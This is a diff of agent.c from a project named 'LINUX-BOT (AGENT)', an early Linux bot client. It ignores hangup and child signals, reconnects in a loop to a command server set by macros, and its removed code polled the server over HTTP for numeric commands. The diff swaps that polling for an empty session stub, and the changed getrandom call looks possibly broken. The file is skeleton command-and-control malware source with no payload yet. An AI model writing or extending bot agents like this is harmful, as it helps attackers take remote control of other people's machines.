@@ -5,7 +5,7 @@
 //     LOCATION : Ukraine
 //
 // [ PINFO ]
-//     DATE     : 09.11.2026
+//     DATE     : 10.11.2026
 //     PROJECT  : LINUX-BOT (AGENT)
 //     PLATFORM : LINUX (x86_64)
 /*=======================================*/
@@ -22,6 +22,11 @@ https://github.com/vk-candpython/linbot/blob/main/agent.h
 
 INTERNAL AGENT DECLARATIONS */
 #include "agent.h"
+
+
+#if (!defined(LINBOT_AGENT_H) || !defined(LINBOT_LINDEF_H))
+    #error "agent.c: agent.h / lindef.h not included."
+#endif
 
 
 
@@ -61,50 +66,15 @@ DEC_FUNC(BOOLEAN) write_full(const LONG fd, CONST_PTR(BYTE) buf, const LONG size
 
 
 
-DEC_FUNC(BOOLEAN) send_GET(const LONG sockFd) {
-    static const BYTE hdrGet[] = BOT_HDR_HTTP_GET;
-    return write_full(sockFd, hdrGet, sizeof(hdrGet) - 1);
+DEC_FUNC(VOID) register_session(const LONG sockFd) {
+
 }
 
 
+DEC_FUNC(VOID) loop_dispatcher(const LONG sockFd) {
+    register_session(sockFd);
 
 
-
-DEC_FUNC(CMDSZ) parse_cmd_int(const BYTE *ptr) {
-    CMDSZ val = 0;
-
-    while (LIKELY_((*ptr >= '0') and (*ptr <= '9')))
-        val = (val * 10) + (*ptr++ - '0');
-
-    return val;
-}
-
-
-DEC_FUNC(CMDSZ) recv_cmd(const LONG sockFd) {
-    static BYTE hdr[SIZE_HTTP_HDR_CMD];
-
-    /* */
-    if (not read_full(sockFd, hdr, SIZE_HTTP_HDR_CMD) or
-        (LOAD_INT_(hdr,      UINT32) != 0x50545448) or
-        (LOAD_INT_(hdr + 13, UINT16) != 0x4B4F)
-    ) return 0;
-
-    return parse_cmd_int(hdr + 9);
-}
-
-
-
-
-DEC_FUNC(VOID) Dispatcher(const LONG sockFd) {
-    while (TRUE) {
-        if (not send_GET(sockFd)) return;
-
-        CMDSZ cmd = recv_cmd(sockFd);
-        if (not cmd) return;
-
-
-        if (cmd == 200) write(1, "hello\n", 6);
-    }
 }
 
 
@@ -125,20 +95,18 @@ DEC_FUNC(BOOLEAN) ignore_sig(const LONG signum) {
 */
 GCC_ATTR_(noreturn, visibility("hidden"))
 VOID Main(VOID) {
-    ignore_sig(SIGHUP );
-    ignore_sig(SIGPIPE);
-    ignore_sig(SIGCHLD);
-
-
+    (VOID)ignore_sig(SIGHUP );
+    (VOID)ignore_sig(SIGPIPE);
+    (VOID)ignore_sig(SIGCHLD);
 
     ULONG seedJitter = 0x243F6A8885A308D3UL; // Fractional part of Pi
-    getrandom(&seedJitter, sizeof(seedJitter), GRND_NONBLOCK);
+    getrandom(&seedJitter, sizeof(seedJitter));
 
     LONG sockFd;
     const sockaddr_in_t sockHost = {
         .sin_family = AF_INET,
-        .sin_port   = htons(BOT_SERVER_PORT),
-        .sin_addr   = BOT_SERVER_IPV4,
+        .sin_port   = htons(LB_SERVER_PORT),
+        .sin_addr   = LB_SERVER_IPV4,
     };
 
 
@@ -148,7 +116,7 @@ VOID Main(VOID) {
 
         if (SYSOK(sockFd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP))) {
             if (SYSOK(connect(sockFd, &sockHost, sizeof(sockaddr_in_t))))
-                Dispatcher(sockFd);
+                loop_dispatcher(sockFd);
 
             close(sockFd);
         }
